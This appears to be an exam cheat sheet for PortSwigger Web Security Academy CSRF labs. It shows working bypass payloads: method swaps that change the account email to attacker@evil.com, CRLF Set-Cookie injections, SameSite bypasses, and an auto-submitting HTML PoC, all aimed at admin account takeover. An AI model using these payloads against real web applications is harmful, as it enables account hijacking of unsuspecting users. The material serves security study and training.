## 🎯 Target Location

**Primary Target:** Email/Password Change Functionality

**Goal:** Change admin's email → Reset admin's password → Login as admin

## 📋 CSRF Bypass Techniques

### Lab 1: Token Validation Depends on Request Method
**Bypass:** Change POST to GET

**Original Request:**
```http
POST /my-account/change-email HTTP/1.1
Content-Type: application/x-www-form-urlencoded

email=attacker@evil.com&csrf=abc123
```

**Bypass:**
```http
GET /my-account/change-email?email=attacker@evil.com HTTP/1.1
```

---

### Lab 2: Token Validation Depends on Token Being Present
**Bypass:** Simply remove CSRF token

---

### Lab 3: Token Not Tied to User Session
**Bypass:** Use your own CSRF token for admin

---

### Lab 4: Token Tied to Non-Session Cookie
**Bypass:** Set victim's csrfKey cookie via CRLF injection

**Exploit:**
```html
<script>
location="https://vulnerable-site.com/?search=w;%0aSet-Cookie:+csrfKey=YOUR_KEY"
</script>
```

---

### Lab 5: Token Duplicated in Cookie
**Bypass:** Set both cookie and parameter to same value

**CRLF Injection:**
```
/?search=w%0d%0aSet-Cookie:%20csrf=kek%3b%20SameSite=None
```

---

### Lab 6: SameSite Lax Bypass via Method Override
**Bypass:** Use GET with `_method=POST` parameter

**Payload:**
```
/my-account/change-email?email=attacker@evil.com&_method=POST
```

---

### Lab 7: SameSite Strict Bypass via Client-Side Redirect
**Bypass:** Use path traversal in redirect parameter

**Payload:**
```
/post/comment/confirmation?postId=1../../../my-account/change-email?email=attacker@evil.com%26submit=1
```

### Lab 8: CSRF cookie not tied to session and cookie injectable via Response Header Injection

If it is possible to inject a header in the responses, then, it can be abused to inject a custom cookie or force a redirection.

If the CSRF cookie is not tied to the session, then it can be setted in the target browser via the Response Header Injection and then abused to force requests.

Request
```http
GET /?search=a%3B%0d%0aSet-Cookie%3A+csrfKey%3DPkaP5qSygNnNYGZ74ou8yVOvo0j25OXb;+SameSite=None HTTP/1.1
Host: 0a0900a003b1919680b5356d00780033.web-security-academy.net
```

Response
```http
HTTP/2 200 OK
Set-Cookie: LastSearchTerm=a;
Set-Cookie: csrfKey=PkaP5qSygNnNYGZ74ou8yVOvo0j25OXb; SameSite=None; Secure; HttpOnly
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 4397

<!DOCTYPE html>
```

It can be abused via a single exploit server by triggering the first request with an image loading (this works only because the session cookie has same site on None, lax would work too).

Payload
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a0900a003b1919680b5356d00780033.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="sectest9m8n7b&#64;test&#46;com" />
      <input type="hidden" name="csrf" value="Xl2kCFRoTQ9zy7O7kNocev6EFPVT4BV1" />
      <input type="submit" value="Submit request" />
    </form>

<img src="https://0a0900a003b1919680b5356d00780033.web-security-academy.net/?search=a%3B%0d%0aSet-Cookie%3A+csrfKey%3Dts4zGzOzlI19pwutqQQI0DQ6QWE8GGqM;+SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```
## 🎓 Exam Tips

1. **Target email change functionality** - Most common CSRF location
2. **Try method change first** - POST → GET is easiest bypass
3. **Remove CSRF token** - Sometimes validation is optional
4. **Use Burp's CSRF PoC generator** - Saves time
5. **Combine with XSS** - CSRF + XSS = powerful attack
